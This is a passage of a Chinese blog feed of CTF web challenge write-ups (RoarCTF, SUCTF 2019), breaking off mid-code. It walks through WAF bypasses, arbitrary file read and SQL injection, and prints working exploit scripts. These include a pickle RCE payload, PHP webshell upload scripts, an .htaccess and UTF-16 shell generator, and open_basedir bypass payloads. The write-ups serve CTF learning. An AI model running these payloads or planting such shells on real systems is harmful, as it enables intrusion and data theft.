<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ccommands</span><span class="number">%0</span>Agetoutput<span class="number">%0</span>Ap0<span class="number">%0</span>A<span class="number">%28</span>S<span class="number">%27</span>cat<span class="number">%20</span>/flag.txt<span class="number">%27</span><span class="number">%0</span>Ap1<span class="number">%0</span>Atp2<span class="number">%0</span>ARp3<span class="number">%0</span>A.</span><br></pre></td></tr></table></figure>
<p>修改become的值为上述payload即可得到flag：<br><img src="/2019/11/19/Python-unserialize-vulnerability/20191119210854994.png" alt="在这里插入图片描述"></p>
<hr>
<p><br></p>
<p><strong>参考链接：</strong></p>
<p><a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/178/</a></p>
<p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RoarCTF_Web_Writeup</title>
    <url>/2019/10/21/RoarCTF-Web-Writeup/</url>
    <content><![CDATA[<p>周末有点事，BUUCTF上复现一下…</p>
<h1 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h1><p>这一题和国赛的lova_math一题看起来有点像…<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191017233227772.png" alt="在这里插入图片描述"><br>源码中提示了这题加了waf，我们访问<code>calc.php</code>，看到源码如下<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191017233459628.png" alt="在这里插入图片描述"><br><code>num</code>传入表达式，然后用<code>eval()</code>计算并输出，因为加了waf所以<code>num</code>中如果有字母，会直接返回403，所以第一步就是绕过它。</p>
<p>比较简单的方式就是直接在查询参数前面加个空格，即将<code>?num=</code>改为<code>? num=</code>即可绕过。</p>
<p>可以参考这篇文章：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p>
<p><strong>当然，如果你觉得上面的方法不够高端，不能凸显你的技术，下面这篇文章提到的方法同样可以绕过。</strong></p>
<p>利用HTTP请求走私来绕过，关于该漏洞可参考这篇文章：<a href="https://paper.seebug.org/1048/#31-cl0get" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
<p>随便测试文中提到的TE-CL方式，发现可以绕过，原理已经在文中说的很清楚，这里就不赘述。</p>
<p><strong>TE-CL</strong><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018001404533.png" alt="在这里插入图片描述"></p>
<p>下面就是如何绕过<code>black_list</code>来拿flag了，思路和国赛那题差不多，也是利用一些数学函数和内置函数来构造。</p>
<p>用<code>scandir</code>读取目录时，首要问题是要构造<code>/</code>，可利用<code>hex2bin(dechex(47))</code>，将<code>/</code>的ascii码进制转为16进制，再转为字符串：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018002257310.png" alt="在这里插入图片描述"><br>然后其他的就是利用<code>base_convert()</code>了，如<code>base_convert(&#39;scandir&#39;,36,10)</code>，于是我们先构造<code>print_r(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</code>读目录</p>
<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018002954170.png" alt="在这里插入图片描述"></p>
<p>然后再利用<code>readfile()</code>读取,最终payload：<code>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code></p>
<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018003909946.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="Easy Java"></a>Easy Java</h1><p>进入之后是一个登录界面，但其实不关登录的事，点开help，如下：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010258912.png" alt="在这里插入图片描述"></p>
<p>看到<code>Download?filename=help.docx</code>，想到任意文件读取…</p>
<p>经尝试，将<code>GET</code>改为<code>POST</code>即可读到</p>
<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010512293.png" alt="在这里插入图片描述"></p>
<p>那么首先读一下，配置Java的配置文件<code>web.xml</code>，位于<code>WEB_INF</code>目录下：</p>
<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010601497.png" alt="在这里插入图片描述"></p>
<p>看到了flag的目录，读一下<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010649707.png" alt="在这里插入图片描述"><br>将该base64解码得到flag</p>
<p><br></p>
<h1 id="Simple-Upload"><a href="#Simple-Upload" class="headerlink" title="Simple Upload"></a>Simple Upload</h1><p>这一题是thinkphp的上传：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018014235621.png" alt="在这里插入图片描述"></p>
<h5 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h5><p>这里有师傅fuzz出，使用<code>xxx.&lt;&gt;php</code>可以绕过来直接进行上传orz…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://27e9c108-617d-42ed-8ad8-afe7e9e4c369.node3.buuoj.cn/index.php/home/index/upload/"</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">files = &#123;<span class="string">"file"</span>: (<span class="string">"shell.&lt;&gt;php"</span>, <span class="string">"&lt;?php eval($_GET['cmd'])?&gt;"</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018014519248.png" alt><br>上传成功，连接即可得到flag.</p>
<h5 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h5><p>通过报错信息，我们可以看出这里是使用了ThinkPHP3.2.4<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018114351713.png" alt="在这里插入图片描述"></p>
<p>于是找个这之前的版本看一下文件上传的部分：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018114633312.png" alt="在这里插入图片描述"><br>可以看到，当<code>$files</code>为空时，会默认将<code>$_FILES</code>赋给<code>$file</code>，即会上传<code>$_FILES</code>中的所有文件，而题目中只会过滤<code>$_FILES[&#39;file&#39;]</code>，因此是可以将shell上传成功的，而只要找到其文件名就可以了，不过只会输出允许文件的位置。</p>
<p>而文件名默认是用<code>uniqid()</code>函数生成的</p>
<ul>
<li>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID</li>
</ul>
<p>所以短时间内上传两个文件的话，可以爆破出相近文件名，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://a4eab965-f727-497b-9c42-8fc52baecb6c.node3.buuoj.cn/index.php/home/index/upload/"</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">files = &#123;<span class="string">"file"</span>: (<span class="string">"1.txt"</span>, <span class="string">"1"</span>),<span class="string">"lethe"</span>: (<span class="string">"shell.php"</span>, <span class="string">"&lt;?php eval($_GET['cmd'])?&gt;"</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line">filename = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(filename)</span></span><br><span class="line">filename = int(filename, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    shellname = hex(filename)[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(shellname)</span></span><br><span class="line">    url = <span class="string">f"http://a4eab965-f727-497b-9c42-8fc52baecb6c.node3.buuoj.cn/Public/Uploads/2019-10-20/<span class="subst">&#123;shellname&#125;</span>.php"</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        print(<span class="string">"Find it: "</span> + url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102100005589.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h1><p>页面的源码里会回显Current IP和Last IP，其实之前做过一道也是回显IP的题，那题是XXF的insert注入，不过那题给了源码，思路比较容易想，且过滤了一些字符，最终是利用了时间盲注。</p>
<p>这一题也是在X-Forwarded-For字段进行注入，只有后一次ip和前一次ip不相同时，才会更新前一次的ip，既然存在插入ip、更新ip的操作，那么就应该可以利用update或者insert注入或者二次注入。</p>
<p>一般来说，insert可以使用延时注入，update可以使用bool盲注和延时盲注，但是如果更新后的数据是可见的话，那么就可能存在二次注入，在insert的时候拼接注入语句，将要查询的数据转化为10进制一起插入数据库中，这样实际上我们要查询的数据就已经在数据库里了，再在回显时就可以拿到数据了。</p>
<p>下面放几张图理解一下：</p>
<p><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102120290699.png" alt="在这里插入图片描述"><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021202915427.png" alt="在这里插入图片描述"><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021202925425.png" alt="在这里插入图片描述"></p>
<p>这一题刚好可以这么操作，类似的可以参考<code>upload（RCTF 2015）</code>一题，在<a href="https://lethe.site/2019/05/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/">这篇文章</a>里我写了这题的wp。</p>
<p>下面进行验证，我们首先构造XXF为：<code>0&#39;+conv(hex(substr((select database()),1,5)),16,10)+&#39;0</code></p>
<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021212946337.png" alt="在这里插入图片描述"></p>
<p>然后随意更换XXF，重新发包2次，第二次发包后我们可以看到成功回显了数据：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021212958163.png" alt="在这里插入图片描述"></p>
<p>注意：一次不能读太多位，不然10进制会用科学计数法表示，就无法转换回原字符串了。</p>
<p>最终脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://node3.buuoj.cn:28136/"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(sql)</span>:</span></span><br><span class="line">    length = <span class="string">""</span></span><br><span class="line">    payload = <span class="string">f"0'+length((<span class="subst">&#123;sql&#125;</span>))+'0"</span></span><br><span class="line">    header = &#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;</span><br><span class="line">    r = s.get(url, headers=header)</span><br><span class="line">    header[<span class="string">'X-Forwarded-For'</span>] = <span class="string">'Lethe'</span></span><br><span class="line">    r = s.get(url, headers=header)</span><br><span class="line">    r = s.get(url, headers=header)</span><br><span class="line">    length = r.text.split(<span class="string">" "</span>)[<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(sql)</span>:</span></span><br><span class="line">    all_result = <span class="string">""</span></span><br><span class="line">    length = int(get_length(sql))</span><br><span class="line">    print(<span class="string">"length: "</span>+str(length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">f"0'+conv(hex(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,5)),16,10)+'0"</span></span><br><span class="line">        header = &#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;</span><br><span class="line">        r = s.get(url, headers=header)</span><br><span class="line">        header[<span class="string">'X-Forwarded-For'</span>] = <span class="string">'Lethe'</span></span><br><span class="line">        r = s.get(url, headers=header)</span><br><span class="line">        r = s.get(url, headers=header)</span><br><span class="line">        result = int(r.text.split(<span class="string">" "</span>)[<span class="number">-2</span>])</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="comment"># print(binascii.a2b_hex(hex(result)[2:]).decode('utf8'))</span></span><br><span class="line">        all_result += binascii.a2b_hex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> all_result</span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = "select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = "select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = "select group_concat(column_name) from information_schema.columns where table_name='F4l9_t4b1e'"</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">"select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e"</span></span><br><span class="line"></span><br><span class="line">print(get_result(sql))</span><br></pre></td></tr></table></figure></p>
<p>结果如下：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102121372930.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF_2019_部分复现</title>
    <url>/2019/08/26/SUCTF-2019-%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>1、进入题目后是一个简单的上传页面：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819172654291.png" alt="在这里插入图片描述"><br>先尝试上传普通的图片马，发现会显示<code>&lt;? in contents!</code>，过滤了<code>&lt;?</code>，可以使用<code>&lt;script language=&#39;php&#39;&gt;&lt;/scrip&gt;</code>绕过。</p>
<p>修改后再次上传发现显示<code>exif_imagetype:not image!</code>，还用了<code>exif_imagetype()</code>进行检验，可以加上GIF89a进行绕过。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173405352.png" alt="在这里插入图片描述"><br>但是后缀正则过滤了<code>php</code>字符，想直接绕过是没戏了。</p>
<p>2、于是考虑解析漏洞，发现服务端不是Apache而是Nginx，所以常见的上传<code>.hatcess</code>文件不可行。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173804810.png" alt="在这里插入图片描述"></p>
<p>参考这篇文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p>
<p>php.ini一定很熟悉了，是php中的配置文件，其中提到了.user.ini文件:</p>
<p>链接：<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a><br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174532748.png" alt="在这里插入图片描述"></p>
<p>再看一下文档对于.user.ini文件的解释：</p>
<p>链接：<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p>
<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174740478.png" alt="在这里插入图片描述"><br>简单来说，它起的作用和.htaccess文件差不多，可以通过在目录下增加.user.ini文件来修改一些配置，可以通过.user.ini文件设置除了<code>PHP_INI_SYSTEM</code>以外的所有模式的选项，且不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
<p>下面就找php.ini中可以利用的配置项，如下:<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819175930926.png" alt="在这里插入图片描述"><br>即<code>auto_prepend_file</code>配置项可以指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</p>
<p>注：还有一个<code>auto_append_file</code>选项，是在解析后进行包含。</p>
<p>利用这两个配置项进行包含的前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件。</p>
<p>4、利用上述配置项进行包含的前提是：含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件。</p>
<p>刚刚上传测试的时候也发现了<code>index.php</code>文件正好就在我们上传的目录下，正好可以利用.</p>
<p>下面还需要让<code>.user.ini</code>文件绕过<code>exif_imagetype()</code>的检测，这时候就不能加<code>GIF89a</code>了，否则配置文件将无法被解析，在配置文件中<code>#</code>为注释，可以在文件开头添加如下内容进行绕过：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 10</span></span><br><span class="line"></span><br><span class="line">auto_prepend_file=shell.jpg</span><br></pre></td></tr></table></figure>
<blockquote>
<p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。</p>
<p>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。</p>
<p>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p>
<p>#define test_width 16</p>
<p>#define test_height 7</p>
</blockquote>
<p>5、成功上传.user.ini文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182711392.png" alt="在这里插入图片描述"></p>
<p>接下来上传包含一句话木马的jpg文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182830861.png" alt="在这里插入图片描述"></p>
<p>这样我们上传的文件就被包含在同目录的那个index.php中了，然后连接此文件即可。</p>
<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082723380334.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h1><p>1、进入题目后，源码显示在了页面上：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码分为两部分，上面是<code>get_the_flag()</code>函数，应该是一个文件上传功能的验证函数，下面是通过<code>_</code>传参进去，如果能通过一系列的检验则可以执行<code>eval()</code>函数。</p>
<p>如果这题是考RCE的话，为什么还要给出文件上传的代码呢…再看那些过滤，几乎很难去绕过，于是考虑调用get_the_flag()函数来看看可不可以通过文件上传功能。</p>
<p>2、所以接下来要构造payload绕过正则检测并且调用get_the_flag()，这里的过滤非常严格，几乎过滤了所有可见字符，仔细看下这篇文章：<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a>  就懂了如何绕过。</p>
<p>可以利用不可见字符的异或来构造，脚本如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($argv[<span class="number">1</span>]);$i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $k = chr($j)^chr(<span class="number">255</span>);  <span class="comment">//dechex(255) = ff</span></span><br><span class="line">        <span class="keyword">if</span>($k == $argv[<span class="number">1</span>][$i])</span><br><span class="line">            $payload .= <span class="string">'%'</span>.dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $payload;</span><br></pre></td></tr></table></figure>
<p>得到：<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022295714.png" alt="在这里插入图片描述"></p>
<p>所以尝试:</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff^<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>b<span class="number">8</span><span class="meta">%</span>ba<span class="meta">%</span>ab&#125;&#123;<span class="meta">%</span>ff&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>ff=phpi<span class="symbol">nfo</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022373196.png" alt="在这里插入图片描述"></p>
<p>发现成功，于是构造payload：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff^<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>b<span class="number">8</span><span class="meta">%</span>ba<span class="meta">%</span>ab&#125;&#123;<span class="meta">%</span>ff&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>ff=get_the_flag</span><br></pre></td></tr></table></figure>
<p>3、接下来就是通过上传来getshell了，这里确实是需要上传<code>.htaccess</code>文件了，绕过方式可以参考这篇文章：<a href="https://www.cnblogs.com/wfzWebSecuity/p/11207145.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11207145.html</a></p>
<ul>
<li>exif_imagetype() 的绕过方式和上面一样</li>
<li>这里注意到php版本为7.2所以，不能用<code>&lt;script&gt;</code>标签绕过<code>&lt;?</code>的过滤了，可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022585743.png" alt="在这里插入图片描述"><br>直接利用脚本生成文件：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SIZE_HEADER = <span class="string">b"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span><span class="params">(filename, script)</span>:</span></span><br><span class="line">	phpfile = open(filename, <span class="string">'wb'</span>) </span><br><span class="line"></span><br><span class="line">	phpfile.write(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">	phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">	phpfile.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span><span class="params">()</span>:</span></span><br><span class="line">	htaccess = open(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">	htaccess.write(SIZE_HEADER)</span><br><span class="line">	htaccess.write(<span class="string">b'AddType application/x-httpd-php .lethe\n'</span>)</span><br><span class="line">	htaccess.write(<span class="string">b'php_value zend.multibyte 1\n'</span>)</span><br><span class="line">	htaccess.write(<span class="string">b'php_value zend.detect_unicode 1\n'</span>)</span><br><span class="line">	htaccess.write(<span class="string">b'php_value display_errors 1\n'</span>)</span><br><span class="line"></span><br><span class="line">	htaccess.close()</span><br><span class="line">		</span><br><span class="line">generate_htacess()</span><br><span class="line"></span><br><span class="line">generate_php_file(<span class="string">"shell.lethe"</span>, <span class="string">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span>)</span><br></pre></td></tr></table></figure>
<p>然后利用Postman分别构造上传<code>.htaccess</code>和<code>shell.lethe</code>:</p>
<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232500140.png" alt="在这里插入图片描述"></p>
<p>得到文件路径后，就可以利用<code>shell.lethe</code>执行命令了，但是还需要绕过<code>open_basedir</code>。</p>
<p>参考：<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2" target="_blank" rel="noopener"><br>从PHP底层看open_basedir bypass</a></p>
<p>于是构造payload如下：<br><code>?cmd=chdir(&#39;/tmp&#39;);mkdir(&#39;lethe&#39;);chdir(&#39;lethe&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(glob(&#39;*&#39;));</code></p>
<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232541683.png" alt="在这里插入图片描述"></p>
<p>得到flag位置后，最后读取flag即可，payload：<br><code>?cmd=chdir(&#39;/tmp&#39;);mkdir(&#39;lethe&#39;);chdir(&#39;lethe&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(file_get_contents(THis_Is_tHe_F14g));</code></p>
<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232651716.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h1><p>进入页面后给了源码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span 